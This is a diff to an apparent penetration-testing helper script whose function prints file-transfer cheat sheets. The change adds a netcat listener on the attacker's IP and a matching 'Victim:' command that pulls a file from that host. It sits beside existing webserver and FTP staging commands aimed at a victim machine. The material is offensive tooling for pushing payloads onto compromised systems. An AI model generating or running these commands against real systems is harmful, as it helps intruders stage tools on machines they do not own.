@@ -237,6 +237,8 @@ def extra(ip,port,file):
     print("\033[32m### File Transfer ###\n\033[0m")
     print("\033[90mPython Webserver:\033[0m python -m SimpleHTTPServer "+port)
     print("\033[90mPHP Webserver:\033[0m php -S "+ip+":"+port+" -t .")
+    print("\033[90mNC Server:\033[0m nc -s "+ip+" -lvp "+port+" < file")
+    print("\033[38;5;208mVictim:\033[0m nc "+ip+" -p "+port+" > file")
     print("\033[90mFTP Webserver:\033[0m python -m pyftpdlib -i "+ip+" -p "+port)
     print("\033[38;5;208mVictim:\033[0m")
     print("echo open "+ip+" "+port+"> ftp.txt")
